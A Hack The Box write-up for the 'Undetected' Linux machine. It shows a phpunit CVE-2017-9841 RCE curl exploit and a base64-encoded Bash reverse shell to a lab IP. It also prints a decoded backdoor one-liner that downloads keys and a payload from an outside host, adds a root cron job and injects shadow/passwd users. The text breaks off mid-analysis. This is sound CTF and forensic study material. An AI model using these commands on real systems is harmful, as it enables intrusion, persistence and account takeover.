<!doctype html><html lang="en"><head><title>Undetected | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine has a website in PHP with a third-party dependency that is vulnerable to RCE. The machine has already been compromised and has some backdoors and exploits that need to be detected and analyzed using reverse engineering techniques"><meta name="image" content="https://7rocky.github.io/images/HTB/Undetected/Undetected.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine has a website in PHP with a third-party dependency that is vulnerable to RCE. The machine has already been compromised and has some backdoors and exploits that need to be detected and analyzed using reverse engineering techniques"><meta itemprop="keywords" content="cve,php,backdoor,forensics,crypto,reversing,rce,hash-cracking,"><meta itemprop="name" content="Undetected"><meta property="article:published_time" content="2022-07-02T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a website in PHP with a third-party dependency that is vulnerable to RCE. The machine has already been compromised and has some backdoors and exploits that need to be detected and analyzed using reverse engineering techniques"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Undetected/Undetected.webp"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Undetected"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/undetected/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Medium machine. This machine has a website in PHP with a third-party dependency that is vulnerable to RCE. The machine has already been compromised and has some backdoors and exploits that need to be detected and analyzed using reverse engineering techniques"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine has a website in PHP with a third-party dependency that is vulnerable to RCE. The machine has already been compromised and has some backdoors and exploits that need to be detected and analyzed using reverse engineering techniques"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Undetected/Undetected.webp"><meta name="twitter:title" content="Undetected"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/undetected/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/undetected/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/undetected/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/undetected/&amp;text=Undetected" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/undetected/&amp;title=Undetected" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Undetected</h1><time class="mt4 f6 dib tracked" datetime="2022-07-02T00:00:00+01:00">02 / 07 / 2022</time><br><p class="mb4 f6 dib tracked">12 minutes to read</p></header><div class="htb-image"><img alt="Undetected" src="/images/HTB/Undetected/Undetected.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/backdoor" title="Backdoor">Backdoor</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/forensics" title="Forensics">Forensics</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/crypto" title="Cryptography">Cryptography</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/reversing" title="Reverse Engineering">Reverse Engineering</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/hash-cracking" title="Password hash cracking">Password hash cracking</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#lateral-movement-to-user-steven">Lateral movement to user <code>steven</code></a></li><li><a href="#apache-service-enumeration">Apache service enumeration</a></li><li><a href="#analyzing-sshd-reverse-engineering">Analyzing <code>sshd</code> (reverse engineering)</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.146</li><li><strong>Release</strong>: 19 / 02 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.146 -p 22,80
Nmap scan report for 10.10.11.146
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey:
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 15.22 seconds
</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="web-enumeration">Web enumeration</h2><p>If we go to <code>http://10.10.11.146</code> we will see a website like this:</p><p><img alt="Undetected index" src="/images/HTB/Undetected/Undetected-index.webp"></p><p>If we click on &ldquo;VISIT STORE&rdquo;, we will be redirected to <code>http://store.djewelry.htb</code>. After setting the subdomain in <code>/etc/hosts</code> we will see the following website:</p><p><img alt="Undetected store index" src="/images/HTB/Undetected/Undetected-store.webp"></p><p>But nothing interesting at all. Let&rsquo;s fuzz to enumerate some routes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://store.djewelry.htb/FUZZ  
<span class="code-dark-blue">images                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 93ms]</span>
<span class="code-dark-blue">css                     [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 129ms]</span>
<span class="code-dark-blue">js                      [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 225ms]</span>
<span class="code-dark-blue">vendor                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 126ms]</span>
<span class="code-dark-blue">fonts                   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 108ms]</span>
<span class="code-dark-green">                        [Status: 200, Size: 6215, Words: 528, Lines: 196, Duration: 184ms]</span>
<span class="code-dark-yellow">server-status           [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 94ms]</span>
</code></pre></div><p>There is a <code>/vendor</code> route:</p><p><img alt="Undetected store vendor" src="/images/HTB/Undetected/Undetected-vendor.webp"></p><p>This directory shows the dependencies of the web project. There is a vulnerability for <code>phpunit</code> that leads to Remote Code Execution (RCE). It is shown in <a href="https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/">blog.ovhcloud.com</a> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9841">CVE-2017-9841</a>) and we can eploit it using a simple <code>curl</code> command:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -d <span class="code-dark-yellow">'&lt;?php system("whoami");'</span> store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  
www-data
</code></pre></div><h2 id="foothold-on-the-machine">Foothold on the machine</h2><p>Nice, let&rsquo;s get a reverse shell on the machine using a Bash command encoded in Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -d <span class="code-dark-yellow">'&lt;?php system("echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash");'</span> store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.146.
Ncat: Connection from 10.10.11.146:46572.
bash: cannot set terminal process group (934): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /
cd /
www-data@production:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@production:/$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@production:/$ export TERM=xterm
www-data@production:/$ export SHELL=bash
www-data@production:/$ stty rows 50 columns 158
</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>The first thing we notice is that there is one user called <code>steven</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@production:/$ ls /home  
steven
</code></pre></div><p>Unexpectedly, there is a user called <code>steven1</code> in <code>/etc/passwd</code>, and with the same user ID (1000):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@production:/$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash  
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
</code></pre></div><p>This is really strange, isn&rsquo;t it? Let&rsquo;s check what files we can access as <code>www-data</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@production:/$ find / -user www-data -type f 2&gt;/dev/null | grep -vE 'proc|www'  
/var/backups/info
</code></pre></div><p>We have <code>/var/backups/info</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@production:/$ ls -l /var/backups/info
-r-x------ 1 www-data www-data 27296 May 14  2021 /var/backups/info  
</code></pre></div><p>We are able to read an execute this file. It is a 64-bit ELF:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@production:/$ file /var/backups/info
/var/backups/info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped  
</code></pre></div><p>If we execute the binary file, we see it is a kernel exploit, but seems not to work:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@production:/$ /var/backups/info
[.] starting
[.] namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr  
[-] substring 'ffff' not found in dmesg
</code></pre></div><p>We can start thinking that the machine is already comprimised.</p><p>Since <code>strings</code> is not installed on the machine, let&rsquo;s transfer the binary to our machine using <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@production:/$ nc 10.10.14.62 4444 &lt; /var/backups/info  
^C
www-data@production:/$ md5sum /var/backups/info
04060ea986c7bacdc64130a1d7b8ca2d  /var/backups/info
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444 &gt; info
Ncat: Version 7.92 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.146.
Ncat: Connection from 10.10.11.146:40972.

<span class="code-cyan">$</span> <span class="code-dark-green">md5sum</span> <span class="mtku">info</span>
04060ea986c7bacdc64130a1d7b8ca2d  info
</code></pre></div><p>Having checked the integrity of the file, we can run <code>strings</code> on it and obtain a large string:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -100 <span class="mtku">info</span>
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b  
</code></pre></div><p>This seems to be encoded in hexadecimal digits (there are only numbers and letters from <code>a</code> to <code>f</code>). Let&rsquo;s decode it using <code>xxd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -100 <span class="mtku">info</span> | <span class="code-dark-green">xxd</span> -r -p
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" &gt;&gt; /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 &gt;= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 &gt;= 1000 {system("echo "$1" "$3" "$6" "$7" &gt; users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" &gt;&gt; /etc/passwd; done &lt; users.txt; rm users.txt;  
</code></pre></div><p>It is a &ldquo;one-liner&rdquo; shell command. If we break it into pieces, we have this:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">wget</span> <span class="mtk1">tempfiles.xyz/authorized_keys</span> <span class="mtk1">-O</span> <span class="mtk1">/root/.ssh/authorized_keys</span>
<span class="mtk1">wget</span> <span class="mtk1">tempfiles.xyz/.main</span> <span class="mtk1">-O</span> <span class="mtk1">/var/lib/.main</span>
<span class="mtk1">chmod</span> <span class="mtk1">755</span> <span class="mtk1">/var/lib/.main</span>

<span class="mtk7">echo</span> <span class="mtk4">"*</span> <span class="mtk4">3</span> <span class="mtk4">*</span> <span class="mtk4">*</span> <span class="mtk4">*</span> <span class="mtk4">root</span> <span class="mtk4">/var/lib/.main"</span> <span class="mtk5">&gt;&gt;</span> <span class="mtk1">/etc/crontab</span>

<span class="mtk1">awk</span> <span class="mtk1">-F</span><span class="mtk4">":"</span> <span class="mtk4">'$7</span> <span class="mtk4">==</span> <span class="mtk4">"/bin/bash"</span> <span class="mtk4">&amp;&amp;</span> <span class="mtk4">$3</span> <span class="mtk4">&gt;=</span> <span class="mtk4">1000</span> <span class="mtk4">{system("echo</span> <span class="mtk4">"$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoO</span><span class="mtk4">vXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM</span><span class="mtk4">0R/BLdACoQ0T9n/:18813:0:99999:7:::</span> <span class="mtk4">&gt;&gt;</span> <span class="mtk4">/etc/shadow")}'</span> <span class="mtk1">/etc/passwd</span>  

<span class="mtk1">awk</span> <span class="mtk1">-F</span><span class="mtk4">":"</span> <span class="mtk4">'$7</span> <span class="mtk4">==</span> <span class="mtk4">"/bin/bash"</span> <span class="mtk4">&amp;&amp;</span> <span class="mtk4">$3</span> <span class="mtk4">&gt;=</span> <span class="mtk4">1000</span> <span class="mtk4">{system("echo</span> <span class="mtk4">"$1"</span> <span class="mtk4">"$3"</span> <span class="mtk4">"$6"</span> <span class="mtk4">"$7"</span> <span class="mtk4">&gt;</span> <span class="mtk4">users.txt")}'</span> <span class="mtk1">/etc/passwd</span>

<span class="mtk5">while</span> <span class="mtk7">read</span> <span class="mtk1">-r</span> <span class="mtk1">user</span> <span class="mtk1">group</span> <span class="mtk1">home</span> <span class="mtk1">shell</span> <span class="mtk1">_</span><span class="mtk5">;</span> <span class="mtk5">do</span>
